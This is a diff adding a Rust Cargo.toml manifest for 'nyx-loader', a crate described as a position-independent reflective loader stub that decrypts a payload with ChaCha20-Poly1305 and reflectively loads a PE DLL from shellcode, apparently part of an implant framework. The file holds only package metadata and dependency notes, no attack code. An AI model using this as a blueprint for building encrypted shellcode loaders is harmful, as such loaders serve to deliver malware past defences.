@@ -1,0 +1,31 @@
+[package]
+name = "nyx-loader"
+version = "0.2.0"
+edition = "2021"
+description = "Nyx PIC reflective loader stub — decrypts and reflectively loads a PE DLL from shellcode"
+
+[lib]
+crate-type = ["lib"]
+
+[dependencies]
+nyx-protocol = { path = "../protocol", default-features = false }
+# Direct crypto deps needed for payload encryption (nyx-protocol re-exports
+# aead_decrypt but not a standalone aead_encrypt — seal_dir requires SessionKey +
+# Direction ceremony that is overkill for simple payload wrapping).
+chacha20poly1305 = { workspace = true, features = ["alloc"] }
+rand = { workspace = true, features = ["std", "std_rng"] }
+# PE parser for the host-side reflective loader (section mapping, base
+# relocations, import resolution). Host-only — this is NOT compiled into the
+# PIC shellcode, which carries its own handwritten loader.
+goblin = { workspace = true }
+
+[dev-dependencies]
+# Used by tests/roundtrip_decrypt.rs to cross-check that a host-side decrypt
+# of a wrap_payload() blob matches the chacha20poly1305 crate's decrypt under
+# the same (key, nonce). Re-declared here because integration tests are
+# external crates and cannot see [dependencies] directly.
+chacha20poly1305 = { workspace = true, features = ["alloc"] }
+
+[features]
+default = ["std"]
+std = ["nyx-protocol/std", "chacha20poly1305/std"]
